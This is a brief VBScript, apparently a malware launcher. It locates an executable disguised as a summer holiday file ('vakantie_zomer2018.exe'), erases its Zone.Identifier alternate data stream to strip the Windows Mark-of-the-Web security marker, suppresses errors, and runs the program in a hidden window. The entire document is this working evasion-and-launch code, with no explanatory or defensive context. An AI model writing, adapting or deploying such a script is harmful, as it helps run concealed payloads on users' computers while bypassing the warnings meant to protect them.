Dim oShell, oFSO, sDir, sExe
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
sDir = oFSO.GetParentFolderName(WScript.ScriptFullName)
sExe = sDir & "\vakantie_zomer2018.exe"
On Error Resume Next
Dim oADS
Set oADS = oFSO.OpenTextFile(sExe & ":Zone.Identifier", 2, True)
If Err.Number = 0 Then
    oADS.Write ""
    oADS.Close
End If
Err.Clear
On Error GoTo 0
oShell.Run Chr(34) & sExe & Chr(34), 0, False
